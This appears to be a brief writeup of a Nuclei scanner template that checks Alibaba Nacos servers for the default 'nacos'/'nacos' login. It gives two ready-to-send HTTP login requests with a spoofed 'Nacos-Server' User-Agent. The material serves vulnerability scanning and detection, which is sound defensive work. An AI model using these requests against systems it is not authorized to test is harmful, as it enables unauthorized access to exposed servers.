# Nuclei Template: Alibaba Nacos - Default Login
**Template ID:** nacos-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`nacos-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The default username and password for Nacos are both nacos.

## Steps to reproduce / Exploit Payload
```http
POST /v1/auth/users/login  HTTP/1.1
Host: {{Hostname}}
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

POST /nacos/v1/auth/users/login  HTTP/1.1
Host: {{Hostname}}
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}
```

